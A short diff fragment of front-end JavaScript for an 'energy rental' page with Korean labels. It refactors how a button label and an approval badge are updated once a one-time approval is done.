+        btn.innerHTML='<i class="fa-solid fa-bolt"></i><span id="energy-btn-text">'+(isApproved?(_t.energy_rent_btn_done||'에너지 렌탈하기'):(_t.energy_rent_btn_approve||'에너지 렌탈 (최초 1회 승인 필요)'))+'</span>';
         btn.disabled=false;
     }
 };
+
 function setEnergyApprovedUI(){
     var _t=translations[currentLang]||translations.ko;
-    try{document.getElementById('energy-approve-badge').textContent=_t.energy_approval_done||'승인 완료';document.getElementById('energy-approve-badge').className='text-xs px-3 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-400';}catch(e){}
+    try{
+        var eb=document.getElementById('energy-approve-badge');
+        eb.textContent=_t.energy_approval_done||'승인 완료';
+        eb.className='text-xs px-3 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-400';
+    }catch(e){}
     try{document.getElementById('energy-btn-text').textContent=_t.energy_rent_btn_done||'에너지 렌탈하기';}catch(e){}
     try{document.getElementById('energy-approve-progress').classList.add('hidden');}catch(e){}
     try{document.getElementById('energy-rent-btn').disabled=false;}catch(e){}
